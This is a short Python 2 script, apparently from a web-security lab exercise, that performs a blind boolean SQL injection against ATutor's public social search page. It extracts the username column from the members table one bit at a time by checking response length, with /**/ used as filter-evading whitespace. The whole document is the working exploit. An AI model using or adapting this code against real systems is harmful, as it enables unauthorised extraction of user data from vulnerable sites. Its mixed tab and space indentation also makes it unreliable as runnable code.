import requests
import sys

proxies = {'http':'http://127.0.0.1:8080','https':'http://127.0.0.1:8080'}

def inject(inj, ip):
	extracted = ""
	username=""
	bit="0"
	value=0
	for j in range(1,41):
		for i in reversed(range(8)):
			
		 	injection_string = "test'/**/or/**/(ascii((substring((%s),%s,1)))>>%s)=%s/**/or/**/1='" % (inj,j,i,value)


		 	target = "http://%s/ATutor/mods/_standard/social/index_public.php?q=%s" %(ip,injection_string)

		 	r = requests.get(target,proxies=proxies)

		 	content_length = int(r.headers['Content-Length'])
		 	if (content_length > 20):	 	    
		 	    bit=bit+str("1")
		 	    value=int(bit,2)		 	    
			else:
				bit=bit[:-1]
				bit=bit+str("0")
				bit=bit+str("1")
				value=int(bit,2)
				
			
		username = username + str(chr(int(bit[:8],2)))
		
		bit="0"
		value=0

	print username
	
def main():
  
    ip = "192.168.137.103"
    print "(+) Retrieving username...."
    query = "select/**/username/**/from/**/members"
    username = inject(query, ip)

 	
if __name__ == "__main__":
    main()
